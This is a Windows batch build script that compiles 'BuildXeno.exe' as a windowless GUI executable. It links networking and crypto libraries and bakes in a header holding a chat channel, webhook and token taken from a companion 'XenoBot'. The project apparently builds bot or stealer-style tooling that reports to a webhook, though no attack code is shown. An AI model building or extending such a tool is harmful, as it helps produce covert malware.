@echo off
setlocal
rem Build BuildXeno.exe (GUI subsystem, no console window).
rem Run from a "x64 Native Tools Command Prompt for VS 2022".

if not defined VCINSTALLDIR (
    echo [!] Run this from the x64 Native Tools Command Prompt.
    exit /b 1
)

cl /nologo /O2 /std:c++17 /EHsc /W4 /permissive- /DNDEBUG ^
   /D_UNICODE /DUNICODE ^
   /I ..\XenoBot ^
   BuildXeno.cpp ^
   /link /SUBSYSTEM:WINDOWS /ENTRY:wWinMainCRTStartup ^
   winhttp.lib bcrypt.lib crypt32.lib advapi32.lib ^
   /OUT:BuildXeno.exe

if errorlevel 1 exit /b 1
if exist ..\XenoBot\xeno_target.h (
    echo [+] baked xeno_target.h ^(channel + webhook + token^)
) else (
    echo [!] no xeno_target.h — run XenoBot and send ".l #channel" first
)
echo [+] BuildXeno.exe built
endlocal
